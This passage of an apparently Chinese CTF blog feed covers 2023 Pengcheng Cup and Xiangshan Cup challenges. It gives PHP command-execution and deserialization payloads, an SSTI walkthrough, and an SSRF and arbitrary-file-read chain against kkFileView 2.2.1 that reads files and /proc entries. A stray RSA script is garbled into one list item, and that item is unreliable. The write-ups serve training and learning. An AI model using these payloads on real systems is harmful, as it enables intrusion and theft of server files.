class="hljs-keyword">break</span><br><span class="hljs-comment"># glob:///var/www/html/backdoor_00fbc51dcdf9eef767597fd26119a894.php</span><br></code></pre></td></tr></table></figure><p>backdoor_00fbc51dcdf9eef767597fd26119a894.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$sandbox</span> = <span class="hljs-string">&#x27;/var/www/html/sandbox/&#x27;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;5050f6511ffb64e1914be4ca8b9d585c&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]).<span class="hljs-string">&#x27;/&#x27;</span>;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$sandbox</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$sandbox</span>);<br>    <br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;title&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>];<br>        <span class="hljs-variable">$title</span>= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;title&#x27;</span>];<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$data</span>)&gt;<span class="hljs-number">5</span>||<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$title</span>)&gt;<span class="hljs-number">3</span>)&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no!no!no!&quot;</span>);<br>        &#125;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$sandbox</span>.<span class="hljs-variable">$title</span>,<span class="hljs-variable">$data</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$title</span>)) &lt;= <span class="hljs-number">10</span>) &#123;<br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;php &#x27;</span>.<span class="hljs-variable">$sandbox</span>.<span class="hljs-variable">$title</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;rm &#x27;</span>.<span class="hljs-variable">$sandbox</span>.<span class="hljs-variable">$title</span>);<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no!no!no!&quot;</span>);<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;reset&#x27;</span>])) &#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;/bin/rm -rf &#x27;</span> . <span class="hljs-variable">$sandbox</span>);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>数组绕过</p><figure><img src="/img/2023鹏城杯/16992314605614.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/backdoor_00fbc51dcdf9eef767597fd26119a894.php?username=datou&amp;title[]=<span class="hljs-number">1</span>&amp;data[]=<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat /f*&quot;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>file_put_contents($sandbox.$title,$data);</code>将data写入<code>$sandbox.$title</code><code>system('php '.$sandbox.$title);</code>执行<code>$sandbox.$title</code></p><p>(复现的话发现好像写不进去文件)</p><h2 id="escape">Escape</h2><p>源码如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs Bash">from sqlite3 import *<br><br>from random import choice<br>from hashlib import sha512<br><br>from flask import Flask, request, Response<br>from flask_limiter import Limiter<br>from flask_limiter.util import get_remote_address<br><br>app = Flask(__name__)<br>limiter = Limiter(<br>    app=app,<br>    key_func=get_remote_address,<br>    default_limits=[<span class="hljs-string">&quot;50000 per hour&quot;</span>],<br>    storage_uri=<span class="hljs-string">&quot;memory://&quot;</span>,<br>)<br><br>salt = b<span class="hljs-string">&#x27;****************&#x27;</span><br><br>class PassHash(str):<br>    def __str__(self):<br>        <span class="hljs-built_in">return</span> sha512(salt + self.encode()).hexdigest()<br><br>    def __repr__(self):<br>        <span class="hljs-built_in">return</span> sha512(salt + self.encode()).hexdigest()<br><br>con = connect(<span class="hljs-string">&quot;users.db&quot;</span>)<br>cur = con.cursor()<br>cur.execute(<span class="hljs-string">&quot;DROP TABLE IF EXISTS users&quot;</span>)<br>cur.execute(<span class="hljs-string">&quot;CREATE TABLE users(username, passhash)&quot;</span>)<br>passhash = PassHash(<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-built_in">join</span>(choice(<span class="hljs-string">&quot;0123456789&quot;</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(16)))<br>cur.execute(<br>    <span class="hljs-string">&quot;INSERT INTO users VALUES (?, ?)&quot;</span>,<br>    (<span class="hljs-string">&quot;admin&quot;</span>, str(passhash))<br>)<br>con.commit()<br><br>@app.route(<span class="hljs-string">&#x27;/source&#x27;</span>)<br>@limiter.limit(<span class="hljs-string">&quot;1/second&quot;</span>)<br>def <span class="hljs-built_in">source</span>():<br>    <span class="hljs-built_in">return</span> Response(open(__file__).<span class="hljs-built_in">read</span>(), mimetype=<span class="hljs-string">&quot;text/plain&quot;</span>)<br><br>@app.route(<span class="hljs-string">&#x27;/&#x27;</span>)<br>@limiter.limit(<span class="hljs-string">&quot;3/second&quot;</span>)<br>def index():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;username&#x27;</span> not <span class="hljs-keyword">in</span> request.args or <span class="hljs-string">&#x27;password&#x27;</span> not <span class="hljs-keyword">in</span> request.args:<br>        <span class="hljs-built_in">return</span> open(<span class="hljs-string">&quot;index.html&quot;</span>).<span class="hljs-built_in">read</span>()<br>    <span class="hljs-keyword">else</span>:<br>        username = request.args[<span class="hljs-string">&quot;username&quot;</span>]<br>        new_pwd = PassHash(request.args[<span class="hljs-string">&quot;password&quot;</span>])<br>        con = connect(<span class="hljs-string">&quot;users.db&quot;</span>)<br>        cur = con.cursor()<br>        res = cur.execute(<br>            <span class="hljs-string">&quot;SELECT * from users WHERE username = ? AND passhash = ?&quot;</span>,<br>            (username, str(new_pwd))<br>        )<br>        <span class="hljs-keyword">if</span> res.fetchone():<br>            <span class="hljs-built_in">return</span> open(<span class="hljs-string">&quot;secret.html&quot;</span>).<span class="hljs-built_in">read</span>()<br>        <span class="hljs-built_in">return</span> (<span class="hljs-string">&quot;Sorry, we couldn&#x27;t find a user &#x27;&#123;user&#125;&#x27; with password hash &lt;code&gt;&#123;&#123;passhash&#125;&#125;&lt;/code&gt;!&quot;</span><br>                .format(user=username)<br>                .format(passhash=new_pwd)<br>                )<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, 10000)<br></code></pre></td></tr></table></figure><p>原题</p><figure><img src="/img/2023鹏城杯/16992314605625.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>不熟悉ssti，但就看这个payload，结合ai和自己的见解简单分析一下（不一定对）</p><p>因为<code>passhash=PassHash(''.join(choice("0123456789") for _ in range(16)))</code>，所以可以调用<code>__str__</code>方法</p><figure><img src="/img/2023鹏城杯/16992314605626.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>然后获取全局<code>&#123;passhash.__str__.__globals__&#125;</code>，里面有app对象</p><figure><img src="/img/2023鹏城杯/16992314605627.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>然后app内有个内置的<code>wsgi_app</code></p><figure><img src="/img/2023鹏城杯/16992314605628.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><img src="/img/2023鹏城杯/16992314605639.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>可以看到有os、sys模块</p><figure><img src="/img/2023鹏城杯/169923146056310.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>这样就可以调用这些模块了，原题有提示在env中，os.environ即可</p><figure><img src="/img/2023鹏城杯/169923146056311.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h1 id="misc">MISC</h1><h2 id="我的壁纸">我的壁纸</h2><p>套娃题，拿了个一血</p><p>拿到bg.jpg</p><p>看到文件中有很多504B0304，分离出zip</p><p>拿到flag.txt、flag.wav、youshouldknowme.jpeg</p><figure><img src="/img/2023鹏城杯/169923146056312.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>flag.txt是snow隐写，密码为rar中的注释，得到flag3</p><figure><img src="/img/2023鹏城杯/169923146056413.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>flag.wav是sstv</p><p>用rx-sstv可以看到一张二维码，扫出来得到flag2</p><p>youshouldknowme.jpeg是steghide，密码在文件尾</p><figure><img src="/img/2023鹏城杯/169923146056414.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>拿到flag1</p><p>3段flag拼起来得到最后的flag</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
      <tag>wp</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023香山杯</title>
    <link href="/2023/10/22/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/"/>
    <url>/2023/10/22/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="香山杯">2023香山杯</h1><h1 id="web">WEB</h1><h2 id="php_unserialize_pro">PHP_unserialize_pro</h2><p>签到题，比较简单的反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Welcome</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span> = <span class="hljs-string">&#x27;welcome&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-string">&#x27;Wh0 4m I?&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;name == <span class="hljs-string">&#x27;A_G00d_H4ck3r&#x27;</span>)&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;arg;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">G00d</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$shell</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$shell</span> = <span class="hljs-variable language_">$this</span>-&gt;shell;<br>            <span class="hljs-variable">$cmd</span> = <span class="hljs-variable language_">$this</span>-&gt;cmd;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/f|l|a|g|\*|\?/i&#x27;</span>, <span class="hljs-variable">$cmd</span>))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;U R A BAD GUY&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$shell</span>(<span class="hljs-variable">$cmd</span>));<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">H4ck3r</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;func;<br>            <span class="hljs-variable">$function</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]))<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <br></code></pre></td></tr></table></figure><p>pop链</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-title class_">Welcome</span>::<span class="hljs-variable constant_">__destruct</span>   <span class="hljs-variable">$name</span><br><span class="hljs-title class_">H4ck3r</span>::<span class="hljs-variable constant_">__toString</span>  <span class="hljs-variable">$func</span><br><span class="hljs-title class_">G00d</span>::<span class="hljs-variable constant_">__invoke</span> <br></code></pre></td></tr></table></figure><p>这里过滤了flag字符，利用more+正则匹配[0-z]绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Welcome</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span> = <span class="hljs-string">&#x27;A_G00d_H4ck3r&#x27;</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">G00d</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$shell</span> = <span class="hljs-string">&#x27;system&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&#x27;more+/[0-z][0-z][0-z][0-z]&#x27;</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">H4ck3r</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>&#125;<br><br><span class="hljs-variable">$aaa</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Welcome</span>();<br><span class="hljs-variable">$aaa</span>-&gt;name = <span class="hljs-keyword">new</span> <span class="hljs-title class_">H4ck3r</span>();<br><span class="hljs-variable">$aaa</span>-&gt;name-&gt;func = <span class="hljs-keyword">new</span> <span class="hljs-title class_">G00d</span>();<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$aaa</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h2 id="sharedbox">sharedBox</h2><p>hint：kkfileview2.2.1 的漏洞利用</p><h3 id="环境配置">环境配置</h3><p>项目地址：https://github.com/kekingcn/kkFileView</p><p>git下来后回退到2.2.1版本</p><figure><img src="/img/2023香山杯/169795243500124.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>因为我本地是windows，所以还要下载OpenOffice</p><p>https://www.openoffice.org/download/</p><p>下载安装完根据readme运行FilePreviewApplication的main方法</p><figure><img src="/img/2023香山杯/16979524349331.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h3 id="漏洞分析">漏洞分析</h3><p>访问<code>http://localhost:8012</code></p><p>原题的kkfileview部署在<code>/fileview/</code>下，本地在<code>/</code>，原题用的linux，本地为windows</p><figure><img src="/img/2023香山杯/16979524349332.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>存在3个路由</p><p><code>/onlinePreview</code>、<code>picturesPreview</code>、<code>/getCorsFile</code></p><figure><img src="/img/2023香山杯/16979524349333.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>主要漏洞点：</p><p><code>/onlinePreview</code>，在线浏览功能，这里有一个xss和ssrf的漏洞<code>picturesPreview</code>，图片预览，有xss漏洞<code>/getCorsFile</code>，任意文件读取和ssrf漏洞</p><p>具体分析：</p><ol type="1"><li>xxxxxxxxxx import gmpy2from Crypto.Util.number import <em>n =121027298948349995679677982412648544403333177260975245569073983061538581058440163574922807151182889153495253964764966037308461724272151584478723275142858008261257709817963330011376266261119767294949088397671360123321149414700981035517299807126625758046100840667081332434968770862731073693976604061597575813313r= getPrime(6)e = 65537a =11001240791308496565411773845509754352597481464288272699325231395472137144610774645372812149675141360600469640492874223541765389441131365669731006263464699c=42256117129723577554705402387775886393426604555611637074394963219097781224776058009003521565944180241032100329456702310737369381890041336312084091995865560402681403775751012856436207938771611177592600423563671217656908392901713661029126149486651409531213711103407037959788587839729511719756709763927616470267p= gmpy2.next_prime(a - r)q = gmpy2.next_prime(gmpy2.next_prime(a) +r)​phi_n = (p-1)</em>(q-1)d = gmpy2.invert(e,phi_n)m =pow(c,d,n)print(long_to_bytes(m))Python</li></ol><p>支持file和http协议，而且没有过滤，造成ssrf</p><ol type="1"><li><code>/getCorsFile</code>下断点</li></ol><figure><img src="/img/2023香山杯/16979524349334.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>跟进到<code>getInputStreamFromUrl</code>这里没有过滤传入的字符，造成了任意文件读取</p><figure><img src="/img/2023香山杯/16979524349335.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>可以参考：https://github.com/kekingcn/kkFileView/issues/128</p><h3 id="题目分析">题目分析</h3><p>在题目的环境中对<code>getCorsFile</code>进行了限制，直接访问的话会返回403</p><p>那么就由此有了一个思路：<code>onlinePreview接口ssrf请求到getCorsFile</code>，然后任意文件读取</p><p>即<code>http://localhost:8012/onlinePreview?url=http://127.0.0.1:8012/getCorsFile?urlPath=file:///C:/Windows/win.ini</code></p><p>但是，我们来看看实际效果</p><figure><img src="/img/2023香山杯/16979524349336.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>文件类型不支持，那么从源码里看看它为什么不支持，以及支持什么格式的文件</p><p>下个断点</p><figure><img src="/img/2023香山杯/16979524349337.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>跟进到这一段，经过<code>getFileNameFromURL</code>处理后得到文件名为<code>getCorsFile</code></p><figure><img src="/img/2023香山杯/16979524349338.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><img src="/img/2023香山杯/16979524349339.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>最终传入判断后返回不支持</p><figure><img src="/img/2023香山杯/169795243493410.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>那么这也说明了无后缀文件是无法读取的，那看看支持的文件格式</p><p>看到这里，返回有picture、pdf、media等，但是这些肯定不支持文本形式的flag</p><p>然后注意到<code>simText</code>类型</p><figure><img src="/img/2023香山杯/169795243493411.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>支持<code>txt</code>、<code>jsp</code>等</p><figure><img src="/img/2023香山杯/169795243493412.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>现在引入一个知识点</p><p>spring boot的路径匹配</p><figure><img src="/img/2023香山杯/169795243493413.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>而源码中的版本恰好是1.5.8</p><figure><img src="/img/2023香山杯/169795243493414.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>那么就有了一个思路：</p><p><code>http://localhost:8012/onlinePreview?url=http://127.0.0.1:8012/getCorsFile.txt?urlPath=file:///C:/Windows/win.ini</code></p><p>这样就会解析成</p><p><code>http://localhost:8012/onlinePreview?url=http://127.0.0.1:8012/getCorsFile?urlPath=file:///C:/Windows/win.ini</code></p><p>然后服务端又是怎么处理这个多出来的<code>.txt</code>呢</p><figure><img src="/img/2023香山杯/169795243493415.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>可以看到file目录下多了<code>getCorsFile.txt</code>，里面的内容就是要读的文件的内容</p><p>那么这个是怎么实现的呢</p><p>onlinePreview 最后调用了 <code>filePreviewHandle</code>，然后调用了<code>downLoad</code></p><figure><img src="/img/2023香山杯/169795243493416.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p><code>downLoad</code>中利用<code>saveBytesToOutStream</code>将读的内容写入文件</p><figure><img src="/img/2023香山杯/169795243493417.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>这里解释了为什么会多一个<code>getCorsFile.txt.txt</code></p><figure><img src="/img/2023香山杯/169795243493418.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>最后就是怎么读取<code>getCorsFile.txt</code></p><p>正常思路</p><p><code>http://localhost:8012/onlinePreview?url=http://127.0.0.1:8012/getCorsFile.txt</code></p><p>但是刚刚提到springboot特性会将<code>getCorsFile.txt</code>解析为<code>getCorsFile</code></p><p>所以用<code>%01</code>、<code>%02</code>等不可见字符（猜测是不可见字符，本地测试是可以的）绕过<code>http://localhost:8012/%01getCorsFile.txt</code></p><h3 id="题解">题解</h3><p>综合上述</p><p>将文件写入</p><p><code>http://localhost:8012/onlinePreview?url=http://127.0.0.1:8012/getCorsFile.txt?urlPath=file:///C:/Windows/win.ini</code></p><p>读文件</p><p><code>http://localhost:8012/onlinePreview?url=http://127.0.0.1:8012/%09getCorsFile.txt</code></p><figure><img src="/img/2023香山杯/169795243493419.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>比赛环境已经关了，赛题的后续利用无法复现了</p><p>最后贴个lxxxin师傅的题解，参考：https://www.yuque.com/dat0u/ctf/lbp2gfi6gttxsymb</p><blockquote><p>最终Payload如下，题目应该是在nginx或者/onlinePreview路由处对proc、fd关键字做了匹配，由于是SSRF，会发起两次http请求，因此可以通过双重URL编码绕过</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-keyword">GET</span> <span class="hljs-string">/fileview/onlinePreview?url=http://localhost:8012/getCorsFile.jsp?urlPath=file:///%2570%2572%256f%2563/29/%2566%2564/6</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>101.201.35.76:22873<br></code></pre></td></tr></table></figure><figure><img src="/img/2023香山杯/169795243493420.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>绕过后，读取的文件内容会保存在getCorsFile.jsp中，用%09、%02等字符绕过一下读取文件即可</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-keyword">GET</span> <span class="hljs-string">/fileview/%09getCorsFile.jsp</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>101.201.35.76:22873<br></code></pre></td></tr></table></figure><figure><img src="/img/2023香山杯/169795243493421.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>比赛的时候，/flag提示我们要RCE，但是这题可以通过非预期读取/proc/29/fd/6获取到flag</p><figure><img src="/img/2023香山杯/169795243493422.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>预期应该是读/root/flag.java文件，然后再往下走......，这里因为赛后靶机关了，也就没机会尝试了，具体的flag.java代码如下，感兴趣的师傅可以自行尝试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">import</span> 